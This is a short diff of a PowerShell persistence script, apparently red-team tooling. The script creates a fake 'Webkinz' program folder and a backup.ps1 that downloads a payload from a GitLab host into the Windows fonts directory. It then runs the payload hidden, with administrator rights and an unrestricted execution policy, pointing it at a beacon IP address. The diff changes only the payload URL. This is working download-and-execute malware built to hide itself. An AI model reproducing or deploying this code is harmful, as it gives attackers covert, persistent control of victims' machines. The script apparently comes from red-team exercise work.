@@ -46,7 +46,7 @@ if(!(Test-Path "C:\Program Files (x86)\Webkinz")){
 if(!(Test-Path "C:\Program Files (x86)\Webkinz\backup.ps1")){
     New-Item -ItemType "File" -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
     $backupCommands = "if(!(Test-Path C:\Windows\fonts\Javalanche.ps1)){"
-    $backupCommands += "wget -o C:\Windows\fonts\Javalanche.ps1 `"gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/windowsPayload.ps1`";"
+    $backupCommands += "wget -o C:\Windows\fonts\Javalanche.ps1 `"https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsPayload.sh?ref_type=heads`";"
     $backupCommands += "Start-Process -FilePath `"powershell.exe`" -ArgumentList `"set-executionpolicy -ExecutionPolicy Unrestricted -Scope Process -Force;& C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress $($beaconIPAddress)`" -WindowStyle Hidden -Verb RunAs"
     $backupCommands | Out-File "C:\Program Files (x86)\Webkinz\backup.ps1"
 }
